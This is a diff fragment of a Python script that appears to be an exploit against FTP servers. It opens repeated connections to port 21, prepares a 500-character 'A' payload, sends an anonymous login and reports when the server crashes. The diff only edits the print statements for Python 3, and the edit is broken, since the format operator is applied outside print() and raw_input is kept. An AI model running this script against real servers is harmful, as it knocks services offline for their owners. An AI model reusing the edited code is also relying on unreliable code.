@@ -33,7 +33,7 @@ i = 0
 while True:
     try:
         sarr.append(socket.create_connection((ip,21)))
-        print "[+] Connection %d" % i
+        print ("[+] Connection %d") % i
         crash1 = "A"*500
  
         sarr[i].send("USER anonymous\r\n" )
@@ -43,6 +43,6 @@ while True:
         sarr[i].recv(4096)
         i+=1
     except socket.error:
-        print "[*] Server crashed!!"
+        print ("[*] Server crashed!!")
         raw_input()
         break
